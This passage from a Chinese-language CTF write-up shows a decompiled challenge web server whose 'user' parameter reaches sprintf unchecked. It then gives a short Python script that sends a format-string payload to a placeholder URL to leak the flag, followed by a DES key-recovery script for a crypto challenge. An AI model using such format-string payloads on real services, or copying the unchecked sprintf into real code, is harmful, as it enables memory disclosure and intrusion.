[rbp-18h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could not open flag file.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fseek(stream, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">  size = ftell(stream);</span><br><span class="line">  fseek(stream, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  fread(ptr, size, <span class="number">1uLL</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  *(ptr + size) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( remove(<span class="string">&quot;flag.txt&quot;</span>) )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;Unable to delete the file &#x27;%s&#x27;.\n&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;File &#x27;%s&#x27; deleted successfully.\n&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">src = MHD_lookup_connection_value(a2, <span class="number">8LL</span>, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( src )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, src, <span class="number">0x63</span>uLL);</span><br><span class="line">      HIBYTE(v44) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(dest, <span class="string">&quot;guest&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *v45 = <span class="number">0LL</span>;</span><br><span class="line">    v46 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x4E10</span>uLL);</span><br><span class="line">    *str = <span class="number">0LL</span>;</span><br><span class="line">    v50 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v51, <span class="number">0</span>, <span class="number">0x4E10</span>uLL);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;v45[<span class="built_in">strlen</span>(v45)], <span class="string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome, &quot;</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(str, dest);</span><br></pre></td></tr></table></figure>
<p>根据user是否为空 如果为空为guest 同时利用sprintf把dest存到了str中 这里就存在了一个格式化字符串漏洞 我们可以利用这个漏洞实现任意地址泄露<br>断点打在sprintf函数上 可以看到偏移为6处可以泄露libc地址，然后顺着可以摸到一个存堆地址的，search一下flag的地址就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://xxxx/login&quot;</span></span><br><span class="line">params = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">b&#x27;%36$saaa\x60\x27\x90\x27\x86\x55\x00\x00&#x27;</span>&#125;</span><br><span class="line">r = requests.get(url, params=params)</span><br><span class="line"><span class="comment">#addr =0x70</span></span><br><span class="line">addr =<span class="number">0x558627902760</span></span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br></pre></td></tr></table></figure>


<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="simple-des"><a href="#simple-des" class="headerlink" title="simple_des"></a>simple_des</h2><p>首先，本题加解密跟一般的DES差不多；虽说其中的有些矩阵可能变了，但没事，把encrypt改一下，成为decrypt就行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>], sub_keys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    plain = IP(plain)</span><br><span class="line">    L, R = plain[:<span class="number">32</span>], plain[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        prev_L = L</span><br><span class="line">        L = R</span><br><span class="line">        expanded_R = EP(R)</span><br><span class="line">        xor_result = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(expanded_R, sub_keys[i])]</span><br><span class="line">        substituted = S_box(xor_result)</span><br><span class="line">        permuted = P(substituted)</span><br><span class="line"></span><br><span class="line">        R = [a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(permuted, prev_L)]</span><br><span class="line"></span><br><span class="line">    cipher = R + L</span><br><span class="line">    cipher = [cipher[x] <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">        <span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">        <span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">        <span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">        <span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">        <span class="number">32</span>,  <span class="number">0</span>, <span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br></pre></td></tr></table></figure>
<p>而本题，我们已知对明文的第一个分组（以下简称c1）进行加密时所产生的部分密钥，其中左半损失了9位。<br>就直接爆破一下，如果得到的轮密钥能将c1解出带有NepCTF{标志的语句，那就说明我们获得了部分密钥。<br>对整体的明文加密，会发现后两次加密的密钥会和前一轮的明文有关，所以就对原来的加密代码稍微修改修改即可。<br>以下是完整的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add</span><br><span class="line"> <span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"> <span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> _IP = [</span><br><span class="line">     <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line">     <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">     <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">     <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,  <span class="number">0</span>,</span><br><span class="line">     <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">     <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">     <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span></span><br><span class="line"> ]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     <span class="keyword">return</span> [plain[x] <span class="keyword">for</span> x <span class="keyword">in</span> _IP]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> __pc1 = [</span><br><span class="line">     <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,  <span class="number">8</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">9</span>,  <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line">     <span class="number">18</span>, <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line">     <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">     <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">13</span>,  <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line">     <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span></span><br><span class="line">     ]</span><br><span class="line"> </span><br><span class="line"> __pc2 = [</span><br><span class="line">     <span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>,  <span class="number">0</span>,  <span class="number">4</span>,</span><br><span class="line">     <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>,  <span class="number">5</span>, <span class="number">20</span>,  <span class="number">9</span>,</span><br><span class="line">     <span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">25</span>,  <span class="number">7</span>,</span><br><span class="line">     <span class="number">15</span>,  <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">1</span>,</span><br><span class="line">     <span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line">     <span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line">     <span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line">     <span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line"> ]</span><br><span class="line"> ROTATIONS = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">PC_1</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     <span class="keyword">return</span> [key[x] <span class="keyword">for</span> x <span class="keyword">in</span> __pc1]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">PC_2</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     <span class="keyword">return</span> [key[x] <span class="keyword">for</span> x <span class="keyword">in</span> __pc2]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 此处函数用不到PC_1, 就注释掉了</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_sub_key</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">     <span class="comment"># key = PC_1(key)</span></span><br><span class="line">     L, R = key[:<span class="number">28</span>], key[<span class="number">28</span>:]</span><br><span class="line"> </span><br><span class="line">     sub_keys = []</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">         <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[i]):</span><br><span class="line">             L.append(L.pop(<span class="number">0</span>))</span><br><span class="line">             R.append(R.pop(<span class="number">0</span>))</span><br><span class="line"> </span><br><span class="line">         combined = L + R</span><br><span class="line">         sub_key = PC_2(combined)</span><br><span class="line">         sub_keys.append(sub_key)</span><br><span class="line">     <span class="keyword">return</span> sub_keys</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> __ep = [</span><br><span class="line">     <span class="number">31</span>,  <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,</span><br><span class="line">     <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,</span><br><span class="line">     <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line">     <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>,</span><br><span class="line">     <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>,</span><br><span class="line">     <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>,  <span class="number">0</span></span><br><span class="line"> ]</span><br><span class="line"> </span><br><span class="line"> __p = [</span><br><span class="line">     <span class="number">15</span>,  <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">16</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>,  <span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>,  <span class="number">9</span>,</span><br><span class="line">     <span class="number">1</span>,  <span class="number">7</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>,  <span class="number">2</span>,  <span class="number">8</span>,</span><br><span class="line">     <span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>,  <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>,  <span class="number">3</span>, <span class="number">24</span></span><br><span class="line"> ]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">EP</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     <span class="keyword">return</span> [data[x] <span class="keyword">for</span> x <span class="keyword">in</span> __ep]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">     <span class="keyword">return</span> [data[x] <span class="keyword">for</span> x <span class="keyword">in</span> __p]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> __s_box = [</span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">14</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>],</span><br><span class="line">         [<span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>],</span><br><span class="line">         [<span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>],</span><br><span class="line">         [<span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">15</span>,  <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>],</span><br><span class="line">         [<span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>],</span><br><span class="line">         [<span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>],</span><br><span class="line">         [<span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>]</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>],</span><br><span class="line">         [<span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>],</span><br><span class="line">         [<span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>],</span><br><span class="line">         [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">     ],</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">     [</span><br><span class="line">         [<span class="number">7</span>, <span 